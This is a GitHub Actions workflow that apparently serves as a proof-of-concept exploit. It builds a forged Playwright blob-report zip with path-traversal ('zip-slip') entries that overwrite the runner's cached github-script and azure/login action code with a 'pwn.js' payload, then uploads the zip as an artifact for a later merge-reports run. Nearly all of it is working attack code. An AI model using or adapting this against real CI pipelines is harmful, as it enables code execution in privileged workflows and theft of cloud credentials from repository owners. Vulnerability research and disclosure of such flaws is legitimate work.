name: tests others

on:
  pull_request:

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Craft malicious blob report zip
        run: |
          python3 - <<'PY'
          import json, zipfile

          meta = {"method":"onBlobReportMetadata","params":{"version":2,"userAgent":"poc","name":"blob-report-1"}}
          conf = {"method":"onConfigure","params":{"config":{"configFile":None,"globalTimeout":0,"maxFailures":0,"metadata":{},"rootDir":"/home/runner/work/gab-poc-pw-merge-report/gab-poc-pw-merge-report","version":"1.50.0","workers":1}}}
          proj = {"method":"onProject","params":{"project":{"name":"poc","outputDir":"/tmp/out","testDir":"/tmp/tests","snapshotDir":"/tmp/snap","ignoreSnapshots":False,"retries":0,"timeout":30000,"metadata":{},"suites":[]}}}
          begin = {"method":"onBegin","params":{}}
          end = {"method":"onEnd","params":{"result":{"status":"passed","startTime":0,"duration":1}}}
          jsonl = "\n".join(json.dumps(e) for e in [meta, conf, proj, begin, end]) + "\n"

          payload = open('pwn.js').read()
          with zipfile.ZipFile('blob-report-1.zip', 'w') as z:
              z.writestr('report.jsonl', jsonl)
              # Zip-slip: Plawright merge-reports extracts entry names with path.join(dir, entryName)
              z.writestr('../../../_actions/actions/github-script/v7/dist/index.js', payload)
              z.writestr('../../../_actions/azure/login/v2/lib/main/index.js', payload)
          print('crafted')
          PY
          ls -la blob-report-1.zip
      - uses: actions/upload-artifact@v4
        with:
          name: blob-report-1
          path: blob-report-1.zip
